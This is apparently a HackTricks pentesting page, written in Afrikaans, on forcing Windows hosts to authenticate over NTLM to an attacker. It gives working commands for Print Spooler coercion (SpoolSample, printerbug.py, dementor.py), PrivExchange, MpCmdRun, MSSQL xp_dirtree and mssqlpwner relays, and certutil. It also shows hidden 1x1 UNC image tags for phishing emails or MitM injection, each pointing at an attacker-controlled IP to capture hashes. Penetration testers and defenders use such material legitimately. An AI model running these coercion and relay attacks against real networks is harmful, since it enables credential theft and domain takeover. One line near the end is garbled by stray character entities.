# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is 'n **versameling** van **afgeleë autentikasie-triggers** wat in C# gekodeer is met MIDL-kompiler om 3departy afhanklikhede te vermy.

## Spooler Service Abuse

As die _**Print Spooler**_ diens **geaktiveer** is, kan jy 'n paar reeds bekende AD-akkrediteerings gebruik om 'n **versoek** aan die Domeinbeheerder se drukbediener te doen vir 'n **opdatering** oor nuwe drukwerk en net vir dit te sê om die **kennisgewing na 'n stelsel te stuur**.\
Let daarop dat wanneer die drukker die kennisgewing na 'n arbitrêre stelsels stuur, dit moet **autentiseer teen** daardie **stelsel**. Daarom kan 'n aanvaller die _**Print Spooler**_ diens laat autentiseer teen 'n arbitrêre stelsel, en die diens sal die **rekenaarrekening** in hierdie autentisering gebruik.

### Finding Windows Servers on the domain

Gebruik PowerShell om 'n lys van Windows-bokse te kry. Bedieners is gewoonlik prioriteit, so kom ons fokus daar:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Vind Spooler dienste wat luister

Gebruik 'n effens aangepaste @mysmartlogin se (Vincent Le Toux se) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), kyk of die Spooler Diens luister:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Jy kan ook rpcdump.py op Linux gebruik en soek na die MS-RPRN Protokol
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Vra die diens om teen 'n arbitrêre gasheer te autentiseer

Jy kan [**SpoolSample van hier**](https://github.com/NotMedic/NetNTLMtoSilverTicket)** saamstel.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
of gebruik [**3xocyte se dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) of [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) as jy op Linux is
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Kombinasie met Onbeperkte Afvaardiging

As 'n aanvaller reeds 'n rekenaar met [Onbeperkte Afvaardiging](unconstrained-delegation.md) gecompromitteer het, kan die aanvaller **die drukker laat outentiseer teen hierdie rekenaar**. As gevolg van die onbeperkte afvaardiging, sal die **TGT** van die **rekenaarrekening van die drukker** **in** die **geheue** van die rekenaar met onbeperkte afvaardiging **gestoor word**. Aangesien die aanvaller hierdie gasheer reeds gecompromitteer het, sal hy in staat wees om **hierdie kaartjie te onttrek** en dit te misbruik ([Pass the Ticket](pass-the-ticket.md)).

## RCP Force outentisering

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Die `PrivExchange` aanval is 'n gevolg van 'n fout wat in die **Exchange Server `PushSubscription` kenmerk** gevind is. Hierdie kenmerk laat die Exchange-server toe om deur enige domein gebruiker met 'n posbus gedwing te word om aan enige kliënt-gelewer gasheer oor HTTP te outentiseer.

Standaard, die **Exchange diens loop as SYSTEM** en word oorgenoeg bevoegdhede gegee (specifiek, dit het **WriteDacl bevoegdhede op die domein voor-2019 Kumulatiewe Opdatering**). Hierdie fout kan benut word om die **oorplasing van inligting na LDAP moontlik te maak en gevolglik die domein NTDS databasis te onttrek**. In gevalle waar oorplasing na LDAP nie moontlik is nie, kan hierdie fout steeds gebruik word om oor te plaas en aan ander gasheer binne die domein te outentiseer. Die suksesvolle benutting van hierdie aanval bied onmiddellike toegang tot die Domein Admin met enige geoutentiseerde domein gebruiker rekening.

## Binne Windows

As jy reeds binne die Windows masjien is, kan jy Windows dwing om met 'n bediener te verbind met behulp van bevoorregte rekeninge met: 

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Of gebruik hierdie ander tegniek: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Dit is moontlik om certutil.exe lolbin (Microsoft-onderteken binêre) te gebruik om NTLM-outeentisering te dwing:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML-inspuiting

### Deur e-pos

As jy die **e-posadres** van die gebruiker wat binne 'n masjien aanmeld wat jy wil kompromitteer, ken, kan jy net vir hom 'n **e-pos met 'n 1x1 beeld** stuur soos
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
en wanneer hy dit oopmaak, sal hy probeer om te autentiseer.

### MitM

As jy 'n MitM-aanval op 'n rekenaar kan uitvoer en HTML in 'n bladsy kan inspuit wat hy sal visualiseer, kan jy probeer om 'n beeld soos die volgende in die bladsy in te spuit:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Kraking NTLMv1

As jy [NTLMv1 uitdagings kan vang, lees hier hoe om hulle te kraak](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;onthou dat jy om NTLMv1 te kraak die Responder-uitdaging op "1122334455667788" moet stel._

{{#include ../../banners/hacktricks-training.md}}
